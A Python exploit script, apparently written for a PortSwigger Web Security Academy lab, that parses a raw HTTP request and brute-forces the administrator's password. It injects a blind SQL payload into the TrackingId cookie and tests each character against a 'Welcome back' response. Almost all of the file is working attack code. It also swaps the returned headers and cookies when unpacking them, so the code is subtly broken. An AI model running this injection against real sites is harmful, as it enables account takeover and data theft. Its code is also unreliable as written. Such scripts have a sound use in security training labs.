import requests
import string

result=[]

rawrequest="""
GET /filter?category=Accessories HTTP/1.1
Host: 0a6400ae0349cdc1c06f792500270010.web-security-academy.net
Cookie: TrackingId=yM7Jyve86FRq4fpI; session=BF1xWp9VoUP2x3C2f1If75Dn6wpAo4u8
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Connection: close
"""

# Choose if the request is https or not
https=True

def getData(rawrequest, https):
    # Creating a list with each line of the request string as an element
    queryLines = rawrequest.split("\n")
    queryLines = queryLines[1:-1]

    # Using another list to save the first line of the request
    firstLine = queryLines.pop(0)
    requestInfo = firstLine.split(" ")

    # Extracting the request type
    requestType = requestInfo[0]

    # Transforming the list into a dictionary (separating the keys from the values with the first appearance of the ":")
    queryDict = dict(map(lambda linea: linea.split(":",1), queryLines))
    queryDict = {k: v[1:] for k, v in queryDict.items()}

    # Setting the host
    baseHost = queryDict.pop('Host')
    protocol = "https" if https else "http"
    port = 443 if https else 8080
    extractedUrl = protocol + "://" + baseHost + ":" + str(port) + requestInfo[1]

    # Saving the cookies
    try:
        cookieList = queryDict.pop('Cookie').split("; ")
        extractedCookies = dict(map(lambda cookie: cookie.split("="), cookieList))
    except KeyError:
        pass
        
    # The remaining lines will represent the headers
    extractedHeaders = queryDict

    return requestType, extractedUrl, extractedCookies, extractedHeaders

# Extracting the data from the raw request
requestType, extractedUrl, extractedHeaders, extractedCookies = getData(rawrequest, https)

# Making an if to select the type of request, it should be expanded with the remaining types 
if(requestType == "GET"):
    print("Replicating GET request...")

    index = range(1, 21)   
    for number in index:
        for letter in list(string.ascii_lowercase+string.digits):      
            cookie = "yM7Jyve86FRq4fpI' AND (SELECT SUBSTRING(password," + str(number) + ",1) FROM users WHERE username='administrator')='" + letter
            extractedCookies['TrackingId'] = cookie
            response = requests.get(url=extractedUrl, headers=extractedHeaders, cookies=extractedCookies)
            if("Welcome back" in response.text):
                result.append(letter)
                print(str(number) + " - " + letter + ": Success")
                break
            print(str(number) + " - " + letter + ": Fail")

print("Administrator password is: " + "".join(result))